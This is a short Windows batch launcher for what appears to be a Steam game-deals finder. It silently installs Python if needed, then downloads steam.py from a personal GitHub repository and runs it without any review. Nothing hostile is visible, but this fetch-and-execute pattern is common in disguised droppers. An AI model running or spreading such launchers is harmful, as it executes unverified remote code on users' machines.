@echo off
REM Check if python is installed
python --version >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Python not found. Downloading and installing Python...
    curl -o python-installer.exe https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe
    start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    del python-installer.exe
    echo Python installed. Please restart this script.
    pause
    exit /b
)

REM Download steam.py and thankyou.html from GitHub RAW links
curl -L -o steam.py https://raw.githubusercontent.com/hahahah12345678/Gamedealsfinderbeta1.0/main/download%20steam.py%20and%20thankyou.html/steam.py
curl -L -o thankyou.html https://raw.githubusercontent.com/hahahah12345678/Gamedealsfinderbeta1.0/main/download%20steam.py%20and%20thankyou.html/thankyou.html

REM Run steam.py
python steam.py

pause